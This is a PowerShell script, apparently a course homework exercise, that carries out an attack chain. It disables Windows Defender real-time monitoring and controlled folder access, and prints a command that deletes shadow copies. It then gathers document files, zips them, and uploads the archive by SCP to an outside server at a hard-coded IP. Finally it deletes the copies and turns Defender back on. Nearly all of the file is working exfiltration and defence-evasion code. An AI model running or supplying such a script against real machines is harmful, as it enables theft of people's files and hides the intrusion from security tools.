
# Task 2 disable windows defender

# we want to disable windows defender first
Set-MpPreference -DisableRealtimeMonitoring $true

# also Disable the controlled folder access
# if this is on, only trusted apps will be able to interact with some folders
Set-MpPreference -EnableControlledFolderAccess $false


# Task 3 remove system restore points

# this requries admin! for safty purposes, this is just printed to the screen
Write-Output "vssadmin delete shadows /all /quiet"


# Task 1 
# our exfil data path
$exfil_path = 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week13\homework\Downloads\workdocuments'

# our exfil zip
$exfil_zip = 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week13\homework\Downloads\workdocuments\workdocuments.zip'

# get a list of our target files
Get-ChildItem -Recurse -Path 'C:\Github-Repos\SYS-320-01-Automation-Scripting\Week13\homework\Documents' -Include *.docx,*.pdf*,*.xlsx,*.txt | Export-Csv -Path files.csv

# import csv file
$filelist = Import-Csv -Path .\files.csv

# create our exfil folder
New-Item -ItemType Directory -Force -Path $exfil_path

# loop throught the results and move them to the exfil location
foreach ($f in $filelist){

    Copy-Item $f.FullName -Destination $exfil_path

}

# zip our stolen files:
Compress-Archive -Path $exfil_path -DestinationPath $exfil_zip -Force

# remove our file tracking csv
Remove-Item -Path .\files.csv -Force


# get our stolen documents and put them on our server
Set-SCPItem -ComputerName '184.171.154.211' -Credential (Get-Credential systest) -Path $exfil_zip -Destination "/home/systest/data/"

# delete files we copied to steal them
Remove-Item -Path $exfil_path -Recurse -Force

# now that we are done, turn defender back on
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -EnableControlledFolderAccess $true
